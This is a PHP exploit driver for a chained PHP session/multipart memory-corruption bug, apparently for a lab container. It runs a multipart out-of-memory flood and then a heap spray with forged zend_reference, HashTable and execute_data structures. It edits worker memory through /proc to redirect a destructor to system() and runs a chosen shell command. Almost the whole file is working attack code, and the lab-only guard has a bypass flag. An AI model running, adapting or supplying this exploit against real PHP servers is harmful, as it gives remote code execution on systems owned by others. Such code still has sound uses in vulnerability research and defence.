<?php
/**
 * php-worker-pin: CVE-2026-109618 / CVE-2026-109619 chain driver
 *
 * Runs INSIDE the target lab container (docker exec / podman exec) so the
 * /proc reader works without host root. Drives the full chain over HTTP:
 *
 *   A2  multipart flood that OOMs request startup after the session
 *       upload-progress hook has published PS(http_session_vars)
 *   B3  page-sized multipart spray carrying a fake zend_reference /
 *       zend_array / zend_execute_data; the stale reference dtor call
 *       reaches zif_system
 *
 * Multi-worker pools: after A2 the tool scans every www-data worker for
 * the stale reference, neutralizes it for calibration, and retries until
 * calibration and payload land on the worker that holds the state.
 */
error_reporting(E_ALL & ~E_DEPRECATED);

$OPTS = getopt('', array(
  'host:', 'port:', 'cmd:', 'pads:', 'pad-len:', 'flood-mb:', 'flood-parts:',
  'cal-values:', 'max-cal-tries:', 'max-pl-tries:', 'offsets:',
  'i-know-this-is-not-a-lab', 'check', 'help',
));
if (isset($OPTS['help'])) { usage(); exit(0); }
if (!count($OPTS) && $argc > 1) {
  fwrite(STDERR, "note: options must come before any positional argument; "
    . "PHP stops option parsing at the first positional. Use --cmd '...'.\n");
}

/* ---- offsets (defaults: php:8.5.11-apache, arm64, libphp.so unstripped) ---- */
define('PS_OFF_DEFAULT', 0x1751f50);
define('ZIF_SYSTEM_DEFAULT', 0x5314f0);
define('O_ID', 0x10); define('O_MOD_DATA', 0x60); define('O_HSV', 0x168);
define('O_HSV_TYPE', 0x170); define('O_SESSION_VARS', 0x1b8);
$PS_OFF = PS_OFF_DEFAULT; $ZIF_SYSTEM = ZIF_SYSTEM_DEFAULT;
if (isset($OPTS['offsets'])) {
  $raw = @file_get_contents($OPTS['offsets']);
  if ($raw === false) { fwrite(STDERR, "offsets file not readable: {$OPTS['offsets']}\n"); exit(2); }
  $j = json_decode($raw, true);
  if (!is_array($j) || !isset($j['ps_off']) || !isset($j['zif_system'])) {
    fwrite(STDERR, "offsets file must be JSON with ps_off and zif_system\n"); exit(2);
  }
  $PS_OFF = (int)base_convert((string)$j['ps_off'], 16, 10);
  $ZIF_SYSTEM = (int)base_convert((string)$j['zif_system'], 16, 10);
}

/* ---- params ---- */
$HOST = isset($OPTS['host']) ? $OPTS['host'] : '127.0.0.1';
$PORT = isset($OPTS['port']) ? (int)$OPTS['port'] : 80;
$CMD  = isset($OPTS['cmd']) ? $OPTS['cmd']
      : 'id > /tmp/pwned; whoami >> /tmp/pwned; hostname >> /tmp/pwned';
$PAD_N     = isset($OPTS['pads']) ? (int)$OPTS['pads'] : 128;
$PAD_LEN   = isset($OPTS['pad-len']) ? (int)$OPTS['pad-len'] : 1024;
$FLOOD_MB  = isset($OPTS['flood-mb']) ? (float)$OPTS['flood-mb'] : 1.0;
$FLOOD_PARTS = isset($OPTS['flood-parts']) ? (int)$OPTS['flood-parts'] : 4000;
$CAL_VALUES  = isset($OPTS['cal-values']) ? (int)$OPTS['cal-values'] : 200;
$MAX_CAL = isset($OPTS['max-cal-tries']) ? (int)$OPTS['max-cal-tries'] : 8;
$MAX_PL  = isset($OPTS['max-pl-tries']) ? (int)$OPTS['max-pl-tries'] : 8;

/* ---- lab guard: refuse non-private hosts unless explicitly overridden ---- */
if (!host_is_lab($HOST) && !isset($OPTS['i-know-this-is-not-a-lab'])) {
  fwrite(STDERR, "refusing to run against $HOST: not a loopback or private "
    . "address. Pass --i-know-this-is-not-a-lab if this is your own lab.\n");
  exit(2);
}

define('SID', 'e1');
$NESTED = 'a[]' . str_repeat('[a]', 62);
$GLOBALS['NESTED'] = $NESTED;

if (isset($OPTS['check'])) { self_check(); exit(0); }

main();

/* ================= implementation ================= */

function usage() {
  echo "php-worker-pin - drive the CVE-2026-109618/109619 chain inside a lab container\n"
    . "usage: php php2shell.php --cmd 'shell command' [options]\n"
    . "every argument must be an --option; there are no positional arguments.\n"
    . "  --host H          ingress host (default 127.0.0.1)\n"
    . "  --port P          ingress port (default 80)\n"
    . "  --cmd '...'       command for system(); writes proof to /tmp/pwned by default\n"
    . "  --pads N          A2 padding fields (default 128)\n"
    . "  --pad-len N       A2 padding value size (default 1024)\n"
    . "  --flood-mb MB     A2 flood block size (default 1.0)\n"
    . "  --flood-parts N   A2 flood nested parts (default 4000)\n"
    . "  --cal-values N    B3 spray values (default 200)\n"
    . "  --max-cal-tries N --max-pl-tries N  retry budgets (default 8)\n"
    . "  --offsets f.json  ps_globals / zif_system overrides (see tools/derive-offsets.sh)\n"
    . "  --check           multipart shape self-test against the lab\n";
}

function host_is_lab($h) {
  if ($h === 'localhost' || $h === '::1') return true;
  if (preg_match('/^127\./', $h)) return true;
  if (preg_match('/^10\./', $h)) return true;
  if (preg_match('/^192\.168\./', $h)) return true;
  if (preg_match('/^172\.(1[6-9]|2\d|3[01])\./', $h)) return true;
  return false;
}

function self_check() {
  /* verifies the multipart shape parses: run against lab www/debug.php */
  global $HOST, $PORT;
  $b = part('pad0', str_repeat('P', 64)) . part('f', 'hello', 'x.txt');
  $r = raw_request($b, $HOST, $PORT, '/debug.php', 15);
  $ok = strpos($r, 'files=1') !== false;
  echo $ok ? "check: multipart shape OK (file part parsed)\n"
           : "check: FAILED - parser did not register the file part\n";
  exit($ok ? 0 : 3);
}

function workers() {
  $out = array();
  foreach (glob('/proc/[0-9]*/cmdline') as $f) {
    $pid = (int)basename(dirname($f));
    if ($pid === 1) continue;
    $cl = str_replace("\0", " ", (string)@file_get_contents($f));
    if (strpos($cl, "FOREGROUND") === false) continue;
    $st = @file_get_contents("/proc/$pid/status");
    if (preg_match('/^Uid:\s+\d+\s+(\d+)/m', $st, $m) && $m[1] === '33') $out[] = $pid;
  }
  sort($out); return $out;
}

function libphp_base($pid) {
  $m = @file("/proc/$pid/maps"); if (!$m) return 0;
  foreach ($m as $line) {
    if (strpos($line, 'libphp.so') === false) continue;
    $f = preg_split('/\s+/', trim($line));
    if ($f[2] === '00000000') return hexdec(explode('-', $f[0])[0]);
  }
  return 0;
}

function read_mem($pid, $addr, $len) {
  $f = @fopen("/proc/$pid/mem", 'rb'); if (!$f) return false;
  fseek($f, $addr); $d = fread($f, $len); fclose($f); return $d;
}
function write_mem($pid, $addr, $data) {
  $f = @fopen("/proc/$pid/mem", 'r+b'); if (!$f) return false;
  fseek($f, $addr); $n = fwrite($f, $data); fclose($f); return $n;
}
function u64($d, $o = 0) { return unpack('P', substr($d, $o, 8))[1]; }
function u32($d, $o = 0) { return unpack('V', substr($d, $o, 4))[1]; }
function p64($v) { return pack('P', $v); }
function wr(&$p, $off, $b) { $p = substr_replace($p, $b, $off, strlen($b)); }

function read_globals($pid, $base) {
  global $PS_OFF;
  $d = read_mem($pid, $base + $PS_OFF, 0x1c0);
  if ($d === false || strlen($d) < 0x1c0) return false;
  return array('hsv' => u64($d, O_HSV), 'htype' => u32($d, O_HSV_TYPE));
}
function disable_dtor($pid, $base) {
  global $PS_OFF;
  write_mem($pid, $base + $PS_OFF + O_HSV_TYPE, pack('V', 0));
  write_mem($pid, $base + $PS_OFF + O_ID, p64(0));
  write_mem($pid, $base + $PS_OFF + O_MOD_DATA, p64(0));
  write_mem($pid, $base + $PS_OFF + O_SESSION_VARS, p64(0));
}

function part($name, $value, $filename = null) {
  $h = "--\nContent-Disposition:name=" . $name;
  if ($filename !== null) $h .= ";filename=" . $filename;
  /* value must end on its own line or the parser drops the part */
  return $h . "\n\n" . $value . ($value !== '' ? "\n" : '');
}
function post_block($size, $parts) {
  $p = "--\nContent-Disposition:name=" . $GLOBALS['NESTED'] . ";filename=\n\n";
  $blk = str_repeat($p, $parts);
  $filler = max(0, (int)(($size - strlen($blk)) / 3));
  return "--\n" . str_repeat("x:\n", $filler) . substr($blk, 3);
}
function a2_body() {
  global $PAD_N, $PAD_LEN, $FLOOD_MB, $FLOOD_PARTS;
  $b = '';
  for ($i = 0; $i < $PAD_N; $i++) $b .= part('pad' . $i, str_repeat('P', $PAD_LEN));
  $b .= part('PHPSESSID', SID);
  $b .= part('PHP_SESSION_UPLOAD_PROGRESS', 'k');
  $b .= part('f', 'hello', 'x.txt');
  $b .= post_block((int)($FLOOD_MB * 1048576), $FLOOD_PARTS);
  return $b;
}
function b3_body($values) {
  $b = part('PHPSESSID', SID) . part('PHP_SESSION_UPLOAD_PROGRESS', 'k');
  foreach ($values as $i => $v) $b .= part('L' . $i, $v);
  return $b;
}
function raw_request($body, $host, $port, $path = '/index.php', $timeout = 180) {
  $fp = @fsockopen($host, $port, $en, $es, 10);
  if (!$fp) return "CONNFAIL:$es";
  stream_set_timeout($fp, $timeout);
  $hdr = "POST $path HTTP/1.1\r\nHost: lab\r\n"
    . "Content-Type: multipart/form-data; boundary=\r\n"
    . "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n";
  fwrite($fp, $hdr);
  $n = strlen($body); $off = 0;
  while ($off < $n) {
    $c = min(65536, $n - $off);
    fwrite($fp, dechex($c) . "\r\n" . substr($body, $off, $c) . "\r\n");
    $off += $c;
  }
  fwrite($fp, "0\r\n\r\n");
  $resp = '';
  while (!feof($fp)) $resp .= fread($fp, 65536);
  fclose($fp);
  return $resp;
}
function marker_value($i) {
  $p = str_repeat('Z', 4064);
  return substr_replace($p, str_pad('IDX' . sprintf('%04d', $i), 16, '.'), 0, 16);
}
function payload_value($base, $page, $hsv, $cmd, $ref_off) {
  global $ZIF_SYSTEM;
  $target = $page + 0x18;
  $p = str_repeat("\x00", 4064);
  /* fake HashTable, pDestructor = zif_system */
  wr($p, 0x000, pack('VV', 1, 0x07));
  wr($p, 0x010, p64($target + 0x80));
  wr($p, 0x018, pack('VV', 1, 1));
  wr($p, 0x020, pack('V', 1));
  wr($p, 0x030, p64($base + $ZIF_SYSTEM));
  /* fake zend_execute_data at 0x80 (doubles as the single Bucket) */
  wr($p, 0x090, p64($target + 0x100));
  wr($p, 0x0ac, pack('V', 1));
  wr($p, 0x0d0, p64($target + 0x140));
  wr($p, 0x0d8, pack('V', 0x106));
  /* fake zend_string holding the command at 0x140 */
  wr($p, 0x140, pack('VV', 1, 0x16));
  wr($p, 0x150, pack('P', strlen($cmd)));
  wr($p, 0x158, $cmd . "\x00");
  /* precise fake reference at the stale address */
  if ($ref_off >= 0) {
    wr($p, $ref_off + 0x00, pack('VV', 1, 0x1a));
    wr($p, $ref_off + 0x08, p64($target));
    wr($p, $ref_off + 0x10, pack('V', 0x307));
  }
  /* reference carpet: cover every 0x20-aligned offset in the page */
  for ($o = 0x1a8; $o <= 0xfa8; $o += 0x20) {
    wr($p, $o, pack('VV', 1, 0x1a));
    wr($p, $o + 0x08, p64($target));
    wr($p, $o + 0x10, pack('V', 0x307));
  }
  return $p;
}
function find_stale() {
  global $PS_OFF;
  foreach (workers() as $pid) {
    $base = libphp_base($pid); if (!$base) continue;
    $g = read_globals($pid, $base);
    if ($g && $g['hsv'] != 0 && ($g['htype'] & 0xff) === 0x0a)
      return array($pid, $base, $g);
  }
  return array(0, 0, null);
}

function main() {
  global $HOST, $PORT, $CMD, $CAL_VALUES, $MAX_CAL, $MAX_PL, $PS_OFF;
  $ws = workers();
  echo "[*] workers: " . implode(',', $ws) . " ingress=$HOST:$PORT\n";
  if (!count($ws)) { echo "[!] no www-data workers found\n"; exit(2); }
  @unlink("/tmp/sess_" . SID);
  @unlink("/tmp/pwned");

  echo "[*] A2: multipart flood OOM\n";
  $r = raw_request(a2_body(), $HOST, $PORT);
  $bd = ($p = strpos($r, "\r\n\r\n")) !== false ? substr($r, $p + 4) : '';
  $oom = strpos($bd, 'Allowed memory size') !== false;
  echo "    resp_len=" . strlen($r) . " oom=" . ($oom ? 'YES' : 'no') . "\n";
  if (!$oom) echo "[!] warning: no in-band OOM; the flood may be too small\n";

  $pid = 0; $base = 0; $g = null;
  for ($t = 0; $t < 6; $t++) {
    usleep(400000);
    list($pid, $base, $g) = find_stale();
    if ($pid) break;
  }
  if (!$pid) { echo "[!] no stale reference found in any worker\n"; exit(2); }
  $hsv = $g['hsv']; $hsv_page = $hsv & ~0xfff;
  echo "[+] stale reference in worker $pid hsv=" . sprintf('0x%x', $hsv)
     . " page_off=0x" . dechex($hsv & 0xfff) . "\n";

  disable_dtor($pid, $base);
  echo "[*] globals neutralized on $pid (calibration safe)\n";

  $values = array();
  for ($i = 0; $i < $CAL_VALUES; $i++) $values[$i] = str_repeat('Z', 4064);
  $cal_body = b3_body(array_map('marker_value', range(0, $CAL_VALUES - 1)));
  $chunk = $hsv & ~0x1fffff;

  $pages = array(); $cal_tries = 0; $idx = -1;
  for ($t = 0; $t < $MAX_CAL && $idx < 0; $t++) {
    $cal_tries++;
    raw_request($cal_body, $HOST, $PORT);
    usleep(200000);
    $mem = read_mem($pid, $chunk, 0x200000);
    if ($mem === false) { echo "[!] cannot read worker $pid chunk\n"; exit(2); }
    $pages = array(); $pos = 0;
    while (($pos = strpos($mem, 'IDX', $pos)) !== false) {
      $tag = substr($mem, $pos, 16);
      if (preg_match('/^IDX\d{4}/', $tag) && u64($mem, $pos - 8) === 4064)
        $pages[(int)substr($tag, 3, 4)] = ($chunk + $pos) & ~0xfff;
      $pos += 3;
    }
    foreach ($pages as $i => $pg) if ($pg === $hsv_page) { $idx = $i; break; }
    echo "    cal try $cal_tries: " . count($pages) . " strings on worker $pid"
       . ($idx >= 0 ? " -> index $idx covers hsv page" : " (landed on another worker)") . "\n";
  }
  if ($idx < 0) { echo "[!] hsv page never covered; pool too large or too noisy\n"; exit(3); }

  $ref_off = $hsv - ($hsv_page + 0x18);
  $values[$idx] = payload_value($base, $hsv_page, $hsv, $CMD, $ref_off);
  $pl_body = b3_body($values);
  write_mem($pid, $base + $PS_OFF + O_HSV, p64($hsv));
  write_mem($pid, $base + $PS_OFF + O_HSV_TYPE, pack('V', 0x30a));
  echo "[*] globals restored on $pid; firing payload (cmd " . strlen($CMD) . " bytes)\n";

  $pl_tries = 0; $ok = false;
  for ($t = 0; $t < $MAX_PL && !$ok; $t++) {
    $pl_tries++;
    $r = raw_request($pl_body, $HOST, $PORT, '/index.php', 30);
    usleep(1000000);
    $out = @file_get_contents('/tmp/pwned');
    echo "    payload try $pl_tries: resp_len=" . strlen($r)
       . " pwned=" . ($out !== false ? 'YES' : 'no') . "\n";
    if ($out !== false) $ok = true;
  }
  echo $ok ? "[+] RCE confirmed: /tmp/pwned =>\n$out" : "[!] no RCE";
  echo "\n[*] summary: stale_worker=$pid cal_tries=$cal_tries pl_tries=$pl_tries\n";
  exit($ok ? 0 : 4);
}
